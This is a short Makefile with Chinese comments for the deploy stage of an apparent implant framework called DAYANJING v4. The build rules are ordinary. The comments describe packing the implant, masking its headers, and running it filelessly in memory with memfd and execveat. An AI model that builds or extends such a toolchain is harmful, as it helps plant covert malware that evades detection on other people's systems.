# DAYANJING v4 — 25_deploy Makefile
#
# 职责：把 monolith/implant（单体植入体）做成可投送制品。
#   打包      20_packer / pk_pack_shaped（v4 整头掩码制品）
#   解包校验  20_packer / pk_unpack_shaped（无损还原）
#   落地执行  20_packer / pk_mexec（memfd + execveat，无文件执行）
#
# 不重复实现任何一层：打包/解包/执行全部复用 20_packer 已有实现。

CC      ?= gcc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -Wstrict-prototypes
CFLAGS  += -D_DEFAULT_SOURCE -I../20_packer/include -I../00_crypto/include

BUILD   := build
# 复用 20_packer 已编译的目标文件（含 crypto_gcm/hash/x25519 与 shaped/pack/mexec）
PACKOBJ := $(wildcard ../20_packer/build/*.o)

.PHONY: all test clean

all: $(BUILD)/deploy_pack $(BUILD)/test_deploy

$(BUILD):
	mkdir -p $(BUILD)

$(BUILD)/deploy_pack: src/deploy_pack.c $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

$(BUILD)/test_deploy: tests/test_deploy.c $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

test: $(BUILD)/deploy_pack $(BUILD)/test_deploy
	./$(BUILD)/test_deploy

clean:
	rm -rf $(BUILD)
